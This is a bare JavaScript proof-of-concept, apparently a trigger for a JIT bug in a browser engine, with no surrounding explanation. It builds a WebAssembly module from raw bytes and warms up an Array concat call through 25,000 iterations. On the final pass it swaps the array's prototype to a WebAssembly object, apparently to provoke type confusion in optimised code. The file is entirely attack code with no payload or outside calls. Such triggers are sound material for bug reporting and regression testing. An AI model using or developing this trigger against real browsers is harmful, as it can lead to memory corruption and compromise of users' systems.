const wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 95, 3, 2, 1, 0, 7, 14, 1, 10, 103, 101, 116, 95, 115, 116, 114, 117, 99, 116, 0, 0, 10, 8, 1, 6, 0, 208, 0, 11]);
const wasm_instance = new WebAssembly.Instance(new WebAssembly.Module(wasm_code));
const wasm_obj = wasm_instance.exports.get_struct();

function poc(arg) {
    return arg.concat([2.2]);
}

let trigger = false;
for (let i = 0; i < 25000; i++) {
    if (i === 24999) {
        trigger = true;
    }
    let a = [1.1];
    if (trigger) {
        Object.setPrototypeOf(a, wasm_obj);
    }
    poc(a);
}